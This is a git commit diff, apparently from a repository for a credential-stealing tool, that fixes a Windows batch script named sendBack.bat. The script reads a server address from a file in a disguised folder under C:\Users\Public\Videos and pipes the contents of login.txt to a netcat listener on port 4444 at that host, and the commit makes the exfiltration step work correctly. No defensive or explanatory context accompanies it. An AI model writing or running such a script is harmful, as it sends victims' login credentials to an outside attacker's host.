5d67ad46885b4122310c670dfcbaae988cb99402
RaupenInspektor <150939693+RaupenInspektor@users.noreply.github.com>
2024-02-29 15:19:19 +0100

    Update sendBack.bat

--- sendBack.bat
+++ sendBack.bat
@@ -1,5 +1,5 @@
 @echo off
-set SERVER_IP = type C:\Users\Public\Videos\GraphicalUserInterface\url.txt
+set /p SERVER_IP=<C:\Users\Public\Videos\GraphicalUserInterface\url.txt
 
 echo Sending data from login.txt to netcat listener...
 type C:\Users\Public\Videos\GraphicalUserInterface\login.txt | nc %SERVER_IP% 4444
